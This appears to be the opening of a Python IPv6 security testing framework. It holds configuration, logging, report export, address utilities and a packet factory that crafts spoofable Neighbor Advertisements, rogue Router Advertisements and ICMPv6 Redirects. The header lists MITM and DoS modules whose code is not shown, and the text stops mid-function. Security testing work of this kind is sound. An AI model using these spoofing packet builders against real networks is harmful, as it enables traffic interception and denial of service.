#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════════════════╗
#  Tool      : OVector — Advanced IPv6 Security Research Framework
#  Category  : ONetwork / IPv6 Security Research & Auditing
#  Purpose   : Host discovery, DNS recon, NDP analysis,
#              traffic analysis, exploit testing, address utilities
#  Developer : khaled.s.haddad
#  Website   : owlsec.org
#  Version   : v1.0
#  Year      : 2026
#  License   : For authorised security research only
# ╠══════════════════════════════════════════════════════════════════════════╣
#  Modules   :
#    Recon   — alive6, dnsdict6, detect-new-ip6, trace6
#    Attack  — parasite6, fake_router6, redir6
#    DoS     — flood_router6, smurf6, dos-new-ip6
#    Exploit — exploit6
#    Utils   — address6, interface-info, network-calc
#    System  — session-log, config, history
#
#  Requires  : pip install scapy netifaces dnspython rich
#              root / sudo for raw socket operations
#
#  LEGAL     : Use ONLY on networks you own or have explicit
#              written authorisation to test. Unauthorised use
#              is illegal and unethical.
# ╚══════════════════════════════════════════════════════════════════════════╝

from __future__ import annotations

# Lab / dry-run safety (Track D): offensive modules default to simulation
OWL_DRY_RUN = True
OWL_LAB_MODE = False
OFFENSIVE_MODULES = {'parasite6','fake_router6','redir6','flood_router6','smurf6','dos-new-ip6','exploit6'}

import os
import re
import sys
import csv
import json
import time
import socket
import signal
import struct
import random
import hashlib
import ipaddress
import threading
import argparse
import traceback
import platform
import subprocess
import queue
import logging
import logging.handlers
import concurrent.futures
import configparser
import atexit
from abc        import ABC, abstractmethod
from collections import defaultdict, deque
from contextlib  import contextmanager, suppress
from dataclasses import dataclass, field
from datetime    import datetime, timezone
from enum        import Enum, auto
from pathlib     import Path
from typing      import (Dict, List, Tuple, Optional, Any,
                          Set, Union, Callable, Iterator, Generator)

# ─── VERSION ─────────────────────────────────────────────────────────────────
TOOL_NAME   = "OVector"
VERSION     = "v1.0"
DEV         = "khaled.s.haddad"
SITE        = "owlsec.org"
YEAR        = "2026"
CONFIG_FILE = Path.home() / ".ovector" / "config.ini"
LOG_DIR     = Path.home() / ".ovector" / "logs"
HIST_FILE   = Path.home() / ".ovector" / "history.json"

# ─── TERMINAL COLOURS ────────────────────────────────────────────────────────
class Color:
    RESET  = '\033[0m'
    CYAN   = '\033[96m'
    MAGENTA= '\033[95m'
    GREEN  = '\033[92m'
    RED    = '\033[91m'
    YELLOW = '\033[93m'
    ORANGE = '\033[38;5;214m'
    DIM    = '\033[2m'
    BOLD   = '\033[1m'
    WHITE  = '\033[97m'
    BLUE   = '\033[94m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BG_RED    = '\033[41m'
    BG_BLUE   = '\033[44m'
    BG_GREEN  = '\033[42m'

    @staticmethod
    def supports_color() -> bool:
        return (hasattr(sys.stdout, 'isatty') and sys.stdout.isatty()
                and platform.system() != 'Windows')

    @staticmethod
    def strip(text: str) -> str:
        return re.sub(r'\033\[[0-9;]*m', '', text)


def c(colour: str, text: Any) -> str:
    if not Color.supports_color():
        return str(text)
    return f"{colour}{text}{Color.RESET}"


R   = Color.RESET
CY  = Color.CYAN
MG  = Color.MAGENTA
GR  = Color.GREEN
RD  = Color.RED
YL  = Color.YELLOW
OR  = Color.ORANGE
DM  = Color.DIM
BD  = Color.BOLD
WH  = Color.WHITE
BL  = Color.BLUE
IT  = Color.ITALIC

SEP       = c(CY, "─" * 70)
SEP_LIGHT = c(DM, "┄" * 70)
SEP_THICK = c(YL, "═" * 70)

# ─── DEPENDENCY CHECK ────────────────────────────────────────────────────────
SCAPY_OK    = False
NETIFACES_OK= False
DNSPYTHON_OK= False
RICH_OK     = False

try:
    from scapy.all            import (send, sr1, sniff, conf as scapy_conf,
                                       Ether, TCP, UDP, IP)
    from scapy.layers.inet6   import (IPv6, ICMPv6EchoRequest, ICMPv6EchoReply,
                                       ICMPv6ND_NS, ICMPv6ND_NA, ICMPv6ND_RS,
                                       ICMPv6ND_RA, ICMPv6ND_Redirect,
                                       ICMPv6NDOptSrcLLAddr, ICMPv6NDOptDstLLAddr,
                                       ICMPv6NDOptMTU, ICMPv6NDOptPrefixInfo,
                                       IPv6ExtHdrFragment, IPv6ExtHdrHopByHop,
                                       PadN)
    from scapy.layers.inet    import ICMP
    SCAPY_OK = True
    scapy_conf.verb = 0
except ImportError:
    pass

try:
    import netifaces
    NETIFACES_OK = True
except ImportError:
    pass

try:
    import dns.resolver
    import dns.exception
    DNSPYTHON_OK = True
except ImportError:
    pass

try:
    from rich.console import Console
    from rich.table   import Table
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
    RICH_OK = True
    _rich_console = Console()
except ImportError:
    pass


# ═══════════════════════════════════════════════════════════════════════════════
#  ENUMS
# ═══════════════════════════════════════════════════════════════════════════════

class Severity(str, Enum):
    CRITICAL = "CRITICAL"
    HIGH     = "HIGH"
    MEDIUM   = "MEDIUM"
    LOW      = "LOW"
    INFO     = "INFO"

    @property
    def color(self) -> str:
        return {
            "CRITICAL": RD + BD,
            "HIGH":     RD,
            "MEDIUM":   YL,
            "LOW":      DM,
            "INFO":     CY,
        }[self.value]


class ModuleCategory(str, Enum):
    RECON   = "Recon"
    ATTACK  = "Attack"
    DOS     = "DoS"
    EXPLOIT = "Exploit"
    UTILS   = "Utils"


# ═══════════════════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════

class Config:
    _defaults = {
        'general': {
            'log_level':    'INFO',
            'color_output': 'true',
            'auto_export':  'false',
            'export_format':'json',
            'output_dir':   str(Path.home() / "ovector_results"),
        },
        'network': {
            'default_timeout':  '2',
            'default_threads':  '10',
            'default_rate_pps': '100',
            'packet_delay':     '0.01',
        },
        'dns': {
            'default_server':   '',
            'query_timeout':    '2',
            'query_retries':    '2',
        },
    }

    def __init__(self):
        self._cfg = configparser.ConfigParser()
        self._load()

    def _load(self):
        for section, values in self._defaults.items():
            if not self._cfg.has_section(section):
                self._cfg.add_section(section)
            for key, val in values.items():
                if not self._cfg.has_option(section, key):
                    self._cfg.set(section, key, val)
        if CONFIG_FILE.exists():
            self._cfg.read(CONFIG_FILE)

    def save(self):
        CONFIG_FILE.parent.mkdir(parents=True, exist_ok=True)
        with open(CONFIG_FILE, 'w') as f:
            self._cfg.write(f)

    def get(self, section: str, key: str, fallback: str = '') -> str:
        return self._cfg.get(section, key, fallback=fallback)

    def getint(self, section: str, key: str, fallback: int = 0) -> int:
        return self._cfg.getint(section, key, fallback=fallback)

    def getfloat(self, section: str, key: str, fallback: float = 0.0) -> float:
        return self._cfg.getfloat(section, key, fallback=fallback)

    def getbool(self, section: str, key: str, fallback: bool = False) -> bool:
        return self._cfg.getboolean(section, key, fallback=fallback)

    def set(self, section: str, key: str, value: str):
        if not self._cfg.has_section(section):
            self._cfg.add_section(section)
        self._cfg.set(section, key, value)

    def all_settings(self) -> Dict:
        result = {}
        for section in self._cfg.sections():
            result[section] = dict(self._cfg.items(section))
        return result


_config = Config()


# ═══════════════════════════════════════════════════════════════════════════════
#  LOGGING SUBSYSTEM
# ═══════════════════════════════════════════════════════════════════════════════

class SessionLogger:
    """Structured file + console logger."""

    def __init__(self):
        LOG_DIR.mkdir(parents=True, exist_ok=True)
        self._log_file = LOG_DIR / f"session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        self._logger   = logging.getLogger("ovector")
        self._logger.setLevel(logging.DEBUG)

        # File handler — always DEBUG
        fh = logging.handlers.RotatingFileHandler(
            self._log_file, maxBytes=10 * 1024 * 1024, backupCount=5,
            encoding='utf-8')
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(logging.Formatter(
            '%(asctime)s | %(levelname)-8s | %(name)s | %(message)s',
            datefmt='%Y-%m-%dT%H:%M:%S'))
        self._logger.addHandler(fh)

        self._events: List[Dict] = []
        atexit.register(self._flush)

    def _flush(self):
        if self._events:
            summary_file = self._log_file.with_suffix('.json')
            with open(summary_file, 'w') as f:
                json.dump({'tool': TOOL_NAME, 'version': VERSION,
                           'events': self._events}, f, indent=2)

    def _record(self, level: str, msg: str, module: str = ''):
        self._events.append({
            'ts':     datetime.now(timezone.utc).isoformat(),
            'level':  level,
            'module': module,
            'msg':    Color.strip(msg),
        })
        getattr(self._logger, level.lower(), self._logger.info)(
            Color.strip(msg))

    def info(self, msg: str, module: str = ''):  self._record('INFO',    msg, module)
    def warn(self, msg: str, module: str = ''):  self._record('WARNING', msg, module)
    def error(self, msg: str, module: str = ''): self._record('ERROR',   msg, module)
    def debug(self, msg: str, module: str = ''): self._record('DEBUG',   msg, module)

    @property
    def log_path(self) -> Path:
        return self._log_file


_session_log = SessionLogger()


# ─── CONSOLE PRINT HELPERS ───────────────────────────────────────────────────

def log_info(msg: str, module: str = ''):
    print(f"  {c(GR,'[+]')} {msg}")
    _session_log.info(msg, module)

def log_warn(msg: str, module: str = ''):
    print(f"  {c(YL,'[!]')} {msg}")
    _session_log.warn(msg, module)

def log_err(msg: str, module: str = ''):
    print(f"  {c(RD,'[✗]')} {msg}")
    _session_log.error(msg, module)

def log_dim(msg: str, module: str = ''):
    print(f"  {c(DM,'[·]')} {c(DM, msg)}")
    _session_log.debug(msg, module)

def log_sec(title: str):
    print(f"\n{SEP_THICK}")
    print(f"  {c(YL+BD, title)}")
    print(f"{SEP_THICK}")

def log_critical(msg: str, module: str = ''):
    print(f"  {c(RD+BD,'[!!!]')} {c(RD+BD, msg)}")
    _session_log.error(f"CRITICAL: {msg}", module)

def prompt(msg: str, default: str = '') -> str:
    hint = f" {c(DM, f'[{default}]')}" if default else ''
    try:
        val = input(f"  {c(YL,'[»]')} {msg}{hint}: ").strip()
        return val if val else default
    except (EOFError, KeyboardInterrupt):
        print()
        return default

def prompt_choice(msg: str, choices: List[str], default: str = '') -> str:
    choice_str = '/'.join(
        c(GR, ch) if ch == default else ch for ch in choices)
    while True:
        val = prompt(f"{msg} [{choice_str}]", default).lower()
        if val in [ch.lower() for ch in choices]:
            return val
        log_warn(f"Invalid choice. Options: {', '.join(choices)}")

def prompt_int(msg: str, default: int, min_val: int = 1,
               max_val: int = 65535) -> int:
    while True:
        raw = prompt(msg, str(default))
        try:
            val = int(raw)
            if min_val <= val <= max_val:
                return val
            log_warn(f"Value must be between {min_val} and {max_val}.")
        except ValueError:
            log_warn("Please enter a valid integer.")

def prompt_float(msg: str, default: float) -> float:
    while True:
        raw = prompt(msg, str(default))
        try:
            return float(raw)
        except ValueError:
            log_warn("Please enter a valid number.")

def prompt_ipv6(msg: str) -> str:
    while True:
        raw = prompt(msg)
        if not raw:
            log_warn("IPv6 address is required.")
            continue
        try:
            ipaddress.IPv6Address(raw)
            return raw
        except ValueError:
            log_warn(f"Invalid IPv6 address: {raw!r}")

def prompt_mac(msg: str) -> str:
    MAC_RE = re.compile(r'^([0-9a-fA-F]{2}[:\-]){5}[0-9a-fA-F]{2}$')
    while True:
        raw = prompt(msg)
        if not raw:
            log_warn("MAC address is required.")
            continue
        if MAC_RE.match(raw):
            return raw.upper().replace('-', ':')
        log_warn(f"Invalid MAC address format: {raw!r}")

def prompt_iface() -> str:
    ifaces = IPv6Utils.list_interfaces()
    if ifaces:
        log_dim(f"Available interfaces: {', '.join(c(CY, i) for i in ifaces)}")
    while True:
        raw = prompt("Interface")
        if not raw:
            log_warn("Interface name is required.")
            continue
        if raw in ifaces or not ifaces:
            return raw
        # Allow proceeding with an unknown interface after user confirmation
        log_warn(f"Interface {raw!r} not detected. "
                 f"Available: {', '.join(ifaces)}")
        if confirm(f"Use {raw!r} anyway?", False):
            return raw

def confirm(msg: str, default: bool = False) -> bool:
    opts = "Y/n" if default else "y/N"
    raw  = prompt(f"{msg} [{opts}]").lower()
    if not raw:
        return default
    return raw in ('y', 'yes')


# ═══════════════════════════════════════════════════════════════════════════════
#  SESSION HISTORY
# ═══════════════════════════════════════════════════════════════════════════════

class SessionHistory:
    def __init__(self, max_entries: int = 100):
        self._entries: deque = deque(maxlen=max_entries)
        self._load()

    def _load(self):
        if HIST_FILE.exists():
            with suppress(Exception):
                data = json.loads(HIST_FILE.read_text())
                self._entries.extend(data.get('entries', [])[-100:])

    def record(self, module: str, target: str, result_summary: Dict):
        entry = {
            'ts':      datetime.now(timezone.utc).isoformat(),
            'module':  module,
            'target':  target,
            'summary': result_summary,
        }
        self._entries.append(entry)
        HIST_FILE.parent.mkdir(parents=True, exist_ok=True)
        with suppress(Exception):
            HIST_FILE.write_text(json.dumps(
                {'tool': TOOL_NAME, 'entries': list(self._entries)}, indent=2))

    def recent(self, n: int = 10) -> List[Dict]:
        return list(self._entries)[-n:]

    def show(self):
        entries = self.recent(20)
        if not entries:
            log_warn("No history recorded yet.")
            return
        log_sec("SESSION HISTORY")
        print(f"  {'#':<4} {'Time':<22} {'Module':<18} {'Target':<35} Findings")
        print(f"  {'─'*4} {'─'*22} {'─'*18} {'─'*35} {'─'*8}")
        for i, e in enumerate(reversed(entries), 1):
            ts     = e['ts'][:19].replace('T', ' ')
            mod    = e['module']
            tgt    = e['target'][:34]
            finds  = e['summary'].get('findings', 0)
            col    = GR if finds else DM
            print(f"  {i:<4} {c(DM, ts)} {c(CY, mod):<27} {tgt:<35} "
                  f"{c(col, str(finds))}")


_history = SessionHistory()


# ═══════════════════════════════════════════════════════════════════════════════
#  DATA STRUCTURES
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class IPv6Host:
    ipv6:             str
    mac:              Optional[str]  = None
    hostname:         Optional[str]  = None
    vendor:           Optional[str]  = None
    is_router:        bool           = False
    is_alive:         bool           = False
    rtt:              float          = 0.0
    open_ports:       List[int]      = field(default_factory=list)
    first_seen:       float          = field(default_factory=time.time)
    last_seen:        float          = field(default_factory=time.time)
    packets_received: int            = 0
    tags:             Set[str]       = field(default_factory=set)
    extra:            Dict           = field(default_factory=dict)

    def to_dict(self) -> Dict:
        return {
            'ipv6':       self.ipv6,
            'mac':        self.mac,
            'hostname':   self.hostname,
            'vendor':     self.vendor,
            'is_router':  self.is_router,
            'is_alive':   self.is_alive,
            'rtt_ms':     round(self.rtt, 3),
            'open_ports': self.open_ports,
            'first_seen': datetime.fromtimestamp(self.first_seen).isoformat(),
            'last_seen':  datetime.fromtimestamp(self.last_seen).isoformat(),
            'packets':    self.packets_received,
            'tags':       list(self.tags),
            'extra':      self.extra,
        }

    def update_seen(self):
        self.last_seen = time.time()
        self.packets_received += 1


@dataclass
class Finding:
    name:        str
    description: str
    severity:    Severity
    module:      str
    timestamp:   float       = field(default_factory=time.time)
    target:      str         = ''
    evidence:    Dict        = field(default_factory=dict)
    mitigations: List[str]   = field(default_factory=list)
    references:  List[str]   = field(default_factory=list)
    cve:         Optional[str] = None

    def to_dict(self) -> Dict:
        return {
            'name':        self.name,
            'severity':    self.severity.value,
            'description': self.description,
            'module':      self.module,
            'target':      self.target,
            'timestamp':   datetime.fromtimestamp(self.timestamp).isoformat(),
            'evidence':    self.evidence,
            'mitigations': self.mitigations,
            'references':  self.references,
            'cve':         self.cve,
        }


class ScanResult:
    def __init__(self, module_name: str):
        self.module    = module_name
        self.timestamp = time.time()
        self.hosts:    List[IPv6Host] = []
        self.findings: List[Finding]  = []
        self.hops:     List[Dict]     = []
        self.raw_data: List[Dict]     = []
        self.errors:   List[Dict]     = []
        self.metadata  = {
            'start_time':       self.timestamp,
            'end_time':         None,
            'duration_s':       None,
            'target':           '',
            'interface':        '',
            'packets_sent':     0,
            'packets_received': 0,
            'threads':          0,
        }
        self._lock = threading.Lock()

    # ── Mutators ─────────────────────────────────────────────────────────────

    def add_host(self, host: IPv6Host):
        with self._lock:
            existing = next((h for h in self.hosts if h.ipv6 == host.ipv6), None)
            if existing:
                existing.update_seen()
                if host.mac: existing.mac = host.mac
            else:
                self.hosts.append(host)
                self.raw_data.append({'type': 'host', **host.to_dict()})

    def add_finding(self, finding: Finding):
        with self._lock:
            self.findings.append(finding)
            self.raw_data.append({'type': 'finding', **finding.to_dict()})

    def add_hop(self, ttl: int, ip: str, rtt: float):
        with self._lock:
            hop = {'ttl': ttl, 'ip': ip, 'rtt_ms': round(rtt, 3)}
            self.hops.append(hop)
            self.raw_data.append({'type': 'hop', **hop})

    def add_error(self, error: str, exc: Exception = None):
        with self._lock:
            entry = {
                'timestamp': datetime.now(timezone.utc).isoformat(),
                'message':   error,
                'exception': str(exc) if exc else None,
            }
            self.errors.append(entry)

    def update_stats(self, *, sent: int = 0, received: int = 0):
        with self._lock:
            self.metadata['packets_sent']     += sent
            self.metadata['packets_received'] += received

    def complete(self):
        self.metadata['end_time']   = time.time()
        self.metadata['duration_s'] = round(
            self.metadata['end_time'] - self.metadata['start_time'], 3)

    # ── Summary ──────────────────────────────────────────────────────────────

    @property
    def summary(self) -> Dict:
        return {
            'hosts':    len(self.hosts),
            'findings': len(self.findings),
            'errors':   len(self.errors),
            'duration': self.metadata.get('duration_s'),
            'pkts_sent': self.metadata['packets_sent'],
        }

    # ── Export ───────────────────────────────────────────────────────────────

    def to_dict(self) -> Dict:
        return {
            'tool':       TOOL_NAME,
            'version':    VERSION,
            'developer':  DEV,
            'website':    SITE,
            'session': {
                'module':    self.module,
                'timestamp': datetime.fromtimestamp(self.timestamp).isoformat(),
            },
            'metadata': self.metadata,
            'hosts':    [h.to_dict() for h in self.hosts],
            'findings': [f.to_dict() for f in self.findings],
            'hops':     self.hops,
            'errors':   self.errors,
        }

    def to_json(self, filename: str) -> str:
        data = self.to_dict()
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        return filename

    def to_csv(self, filename: str) -> str:
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            w = csv.writer(f)
            # Hosts sheet
            w.writerow(['=== HOSTS ==='])
            w.writerow(['IPv6', 'MAC', 'Hostname', 'Router', 'RTT_ms',
                        'First_Seen', 'Last_Seen', 'Packets', 'Tags'])
            for h in self.hosts:
                d = h.to_dict()
                w.writerow([d['ipv6'], d['mac'] or '', d['hostname'] or '',
                             d['is_router'], d['rtt_ms'],
                             d['first_seen'], d['last_seen'],
                             d['packets'], ','.join(d['tags'])])
            w.writerow([])
            # Findings sheet
            w.writerow(['=== FINDINGS ==='])
            w.writerow(['Severity', 'Name', 'Target', 'Description',
                        'Timestamp', 'CVE'])
            for fd in self.findings:
                d = fd.to_dict()
                w.writerow([d['severity'], d['name'], d['target'],
                             d['description'], d['timestamp'], d['cve'] or ''])
        return filename

    def to_html(self, filename: str) -> str:
        now  = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        rows_hosts = ""
        for h in self.hosts:
            d = h.to_dict()
            rows_hosts += (f"<tr><td>{d['ipv6']}</td><td>{d['mac'] or '-'}</td>"
                           f"<td>{d['hostname'] or '-'}</td>"
                           f"<td>{'✓' if d['is_router'] else '-'}</td>"
                           f"<td>{d['rtt_ms']}</td></tr>\n")
        rows_finds = ""
        sev_badge = {
            'CRITICAL': '#d32f2f','HIGH':'#f57c00',
            'MEDIUM':'#fbc02d','LOW':'#388e3c','INFO':'#1976d2'}
        for fd in self.findings:
            d   = fd.to_dict()
            col = sev_badge.get(d['severity'], '#888')
            rows_finds += (
                f"<tr>"
                f"<td><span style='background:{col};color:#fff;"
                f"padding:2px 8px;border-radius:4px;font-size:.75em'>"
                f"{d['severity']}</span></td>"
                f"<td>{d['name']}</td><td>{d['target']}</td>"
                f"<td>{d['description']}</td></tr>\n")
        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>{TOOL_NAME} Report — {self.module}</title>
  <style>
    :root {{--accent:#00bcd4;--bg:#0d1117;--surface:#161b22;
            --border:#30363d;--text:#e6edf3;--dim:#8b949e}}
    * {{box-sizing:border-box;margin:0;padding:0}}
    body {{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);
           color:var(--text);padding:2rem}}
    h1   {{color:var(--accent);font-size:1.8rem;margin-bottom:.25rem}}
    h2   {{color:var(--accent);font-size:1.1rem;margin:1.5rem 0 .5rem;
           border-left:3px solid var(--accent);padding-left:.75rem}}
    .meta {{color:var(--dim);font-size:.85rem;margin-bottom:1.5rem}}
    .badge {{display:inline-block;background:var(--accent);color:#000;
             padding:2px 10px;border-radius:12px;font-size:.8rem;
             font-weight:600;margin-right:.5rem}}
    table {{width:100%;border-collapse:collapse;margin-bottom:1rem;
            font-size:.875rem}}
    th    {{background:var(--surface);color:var(--accent);
            border:1px solid var(--border);padding:.5rem .75rem;text-align:left}}
    td    {{border:1px solid var(--border);padding:.45rem .75rem}}
    tr:nth-child(even) {{background:#0f1318}}
    .card {{background:var(--surface);border:1px solid var(--border);
            border-radius:8px;padding:1rem 1.25rem;margin-bottom:1rem}}
    .stat {{display:inline-block;margin-right:2rem}}
    .stat .val {{font-size:1.5rem;font-weight:700;color:var(--accent)}}
    .stat .lbl {{font-size:.75rem;color:var(--dim);display:block}}
  </style>
</head>
<body>
  <h1>{TOOL_NAME} <span style="color:#8b949e;font-size:1rem">{VERSION}</span></h1>
  <div class="meta">{DEV} · {SITE} · Generated: {now}</div>

  <div class="card">
    <div class="badge">{self.module.upper()}</div>
    <span class="stat"><span class="val">{len(self.hosts)}</span>
      <span class="lbl">Hosts Found</span></span>
    <span class="stat"><span class="val">{len(self.findings)}</span>
      <span class="lbl">Findings</span></span>
    <span class="stat"><span class="val">{self.metadata['packets_sent']}</span>
      <span class="lbl">Pkts Sent</span></span>
    <span class="stat"><span class="val">{self.metadata.get('duration_s','—')}s</span>
      <span class="lbl">Duration</span></span>
  </div>

  <h2>Discovered Hosts</h2>
  <table>
    <tr><th>IPv6</th><th>MAC</th><th>Hostname</th><th>Router</th><th>RTT (ms)</th></tr>
    {rows_hosts or "<tr><td colspan='5' style='color:var(--dim)'>None</td></tr>"}
  </table>

  <h2>Security Findings</h2>
  <table>
    <tr><th>Severity</th><th>Name</th><th>Target</th><th>Description</th></tr>
    {rows_finds or "<tr><td colspan='4' style='color:var(--dim)'>None</td></tr>"}
  </table>
</body>
</html>"""
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        return filename


# ═══════════════════════════════════════════════════════════════════════════════
#  IPv6 UTILITIES
# ═══════════════════════════════════════════════════════════════════════════════

class IPv6Utils:

    # ── MAC ↔ IPv6 ──────────────────────────────────────────────────────────

    @staticmethod
    def mac_to_eui64(mac: str) -> str:
        m = re.sub(r'[:\-\.]', '', mac).upper()
        if len(m) != 12:
            raise ValueError(f"Invalid MAC address: {mac!r}")
        # Flip the U/L bit (bit 6 of first octet)
        first_octet = int(m[:2], 16) ^ 0x02
        eui64 = f"{first_octet:02X}{m[2:6]}FFFE{m[6:]}"
        return eui64

    @staticmethod
    def mac_to_linklocal(mac: str) -> str:
        eui64 = IPv6Utils.mac_to_eui64(mac).lower()  # 16 hex chars
        groups = [eui64[i:i+4] for i in range(0, 16, 4)]
        return "fe80::" + ":".join(groups)

    @staticmethod
    def mac_to_global(mac: str, prefix: str) -> str:
        eui64  = IPv6Utils.mac_to_eui64(mac).lower()  # 16 hex chars
        groups = [eui64[i:i+4] for i in range(0, 16, 4)]
        iid    = ":".join(groups)
        return prefix.rstrip(':/') + ':' + iid

    @staticmethod
    def ipv6_to_mac(ipv6: str) -> Optional[str]:
        addr = ipaddress.IPv6Address(ipv6)
        exp  = addr.exploded.replace(':', '')
        # Must be EUI-64 derived (bytes 4-5 == fffe)
        if exp[8:12].lower() != 'fffe':
            return None
        raw  = exp[:8] + exp[12:]
        mac  = format(int(raw[:6], 16) ^ 0x020000, '06x') + raw[6:]
        return ':'.join(mac[i:i+2] for i in range(0, 12, 2))

    @staticmethod
    def get_solicited_multicast(ipv6: str) -> str:
        last24 = format(int(ipaddress.IPv6Address(ipv6)) & 0xFFFFFF, '06x')
        return f"ff02::1:ff{last24[:2]}:{last24[2:]}"

    # ── Address manipulation ────────────────────────────────────────────────

    @staticmethod
    def expand(ipv6: str) -> str:
        try:   return ipaddress.IPv6Address(ipv6).exploded
        except: return ipv6

    @staticmethod
    def compress(ipv6: str) -> str:
        try:   return ipaddress.IPv6Address(ipv6).compressed
        except: return ipv6

    @staticmethod
    def classify(ipv6: str) -> Dict:
        try:
            addr = ipaddress.IPv6Address(ipv6)
            return {
                'loopback':    addr.is_loopback,
                'link_local':  addr.is_link_local,
                'site_local':  addr.is_site_local,
                'global':      addr.is_global,
                'multicast':   addr.is_multicast,
                'private':     addr.is_private,
                'unspecified': addr.is_unspecified,
                'ipv4_mapped': addr.ipv4_mapped is not None,
                'teredo':      addr.teredo is not None,
                'sixtofour':   addr.sixtofour is not None,
            }
        except ValueError:
            return {}

    @staticmethod
    def in_network(ipv6: str, network: str) -> bool:
        try:
            return (ipaddress.IPv6Address(ipv6)
                    in ipaddress.IPv6Network(network, strict=False))
        except ValueError:
            return False

    @staticmethod
    def network_info(cidr: str) -> Dict:
        try:
            net = ipaddress.IPv6Network(cidr, strict=False)
            return {
                'network':       str(net.network_address),
                'prefix_len':    net.prefixlen,
                'num_addresses': net.num_addresses,
                'is_private':    net.is_private,
                'is_global':     net.is_global,
                'is_multicast':  net.is_multicast,
                'first_host':    str(net.network_address + 1),
                'last_host':     str(net.broadcast_address - 1),
            }
        except ValueError as e:
            raise ValueError(f"Invalid network: {e}")

    # ── Interface helpers ───────────────────────────────────────────────────

    @staticmethod
    def get_interface_mac(iface: str) -> str:
        if NETIFACES_OK:
            with suppress(Exception):
                return netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr'].upper()
        with suppress(Exception):
            path = Path(f"/sys/class/net/{iface}/address")
            return path.read_text().strip().upper()
        return "00:00:00:00:00:00"

    @staticmethod
    def get_interface_ipv6(iface: str) -> List[str]:
        addrs = []
        if NETIFACES_OK:
            with suppress(Exception):
                for entry in netifaces.ifaddresses(iface).get(netifaces.AF_INET6, []):
                    addrs.append(entry['addr'].split('%')[0])
        return addrs

    @staticmethod
    def list_interfaces() -> List[str]:
        if NETIFACES_OK:
            return netifaces.interfaces()
        ifaces = []
        with suppress(Exception):
            with open("/proc/net/dev") as f:
                for line in f.readlines()[2:]:
                    name = line.split(':')[0].strip()
                    if name:
                        ifaces.append(name)
        return ifaces

    @staticmethod
    def interface_summary(iface: str) -> Dict:
        mac   = IPv6Utils.get_interface_mac(iface)
        addrs = IPv6Utils.get_interface_ipv6(iface)
        return {
            'name':  iface,
            'mac':   mac,
            'ipv6':  addrs,
            'link_local': [a for a in addrs if a.startswith('fe80')],
            'global':     [a for a in addrs
                           if not a.startswith('fe80') and not a.startswith('::')],
        }

    # ── Reverse DNS ─────────────────────────────────────────────────────────

    @staticmethod
    def reverse_dns(ipv6: str) -> Optional[str]:
        with suppress(Exception):
            return socket.gethostbyaddr(ipv6)[0]
        return None

    # ── OUI vendor lookup (offline) ─────────────────────────────────────────

    _OUI_DB: Dict[str, str] = {
        '00:50:56': 'VMware',      '00:0C:29': 'VMware',
        '00:1A:11': 'Google',      '00:1B:63': 'Apple',
        'AC:DE:48': 'Apple',       '00:50:F2': 'Microsoft',
        'DC:A6:32': 'Raspberry Pi','B8:27:EB': 'Raspberry Pi',
        '00:16:3E': 'Xen',         '52:54:00': 'QEMU/KVM',
    }

    @staticmethod
    def mac_vendor(mac: str) -> Optional[str]:
        oui = mac.upper()[:8]
        return IPv6Utils._OUI_DB.get(oui)


# ═══════════════════════════════════════════════════════════════════════════════
#  PACKET FACTORY
# ═══════════════════════════════════════════════════════════════════════════════

class PktFactory:
    """Centralised packet construction with validation."""

    @staticmethod
    def echo_request(dst: str, src: str = None,
                     seq: int = 1, data: bytes = b'OVECTOR'):
        if not SCAPY_OK:
            raise RuntimeError("Scapy not available")
        ip = IPv6(dst=dst) if not src else IPv6(src=src, dst=dst)
        return ip / ICMPv6EchoRequest(seq=seq, data=data)

    @staticmethod
    def ns(target: str, src: str, src_mac: str):
        mc = IPv6Utils.get_solicited_multicast(target)
        return (IPv6(src=src, dst=mc)
                / ICMPv6ND_NS(tgt=target)
                / ICMPv6NDOptSrcLLAddr(lladdr=src_mac.lower()))

    @staticmethod
    def na(target: str, src: str, tgt_mac: str,
           router: bool = False, solicited: bool = True, override: bool = True):
        return (IPv6(src=src, dst=target)
                / ICMPv6ND_NA(tgt=src, R=int(router),
                               S=int(solicited), O=int(override))
                / ICMPv6NDOptDstLLAddr(lladdr=tgt_mac.lower()))

    @staticmethod
    def rs(src_mac: str):
        return (IPv6(dst="ff02::2")
                / ICMPv6ND_RS()
                / ICMPv6NDOptSrcLLAddr(lladdr=src_mac.lower()))

    @staticmethod
    def ra(src: str, src_mac: str, prefix: str,
           prefix_len: int = 64, lifetime: int = 1800,
           router_lifetime: int = 1800):
        return (IPv6(src=src, dst="ff02::1")
                / ICMPv6ND_RA(routerlifetime=router_lifetime)
                / ICMPv6NDOptSrcLLAddr(lladdr=src_mac.lower())
                / ICMPv6NDOptMTU(mtu=1500)
                / ICMPv6NDOptPrefixInfo(
                    prefix=prefix, prefixlen=prefix_len,
                    validlifetime=lifetime, preferredlifetime=lifetime // 2))

    @staticmethod
    def redirect(src: str, dst: str, new_dst: str,
                 src_mac: str, tgt_mac: str):
        return (IPv6(src=src, dst=dst)
                / ICMPv6ND_Redirect(dst=new_dst, tgt=dst)
                / ICMPv6NDOptDstLLAddr(lladdr=tgt_mac.lower()))

    @staticmethod
    def tcp_syn(dst: str, dport: int, src: str = None, sport: int = None):
        src   = src   or "fe80::1"
        sport = sport or random.randint(1024, 65535)
        return (IPv6(src=src, dst=dst)
                / TCP(sport=sport, dport=dport, flags="S",
                      seq=random.randint(0, 2**32 - 1)))

    @staticmethod
    def random_ra_mac() -> Tuple[str, str]:
        """Return (random_link_local, random_mac) pair."""
        mac = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
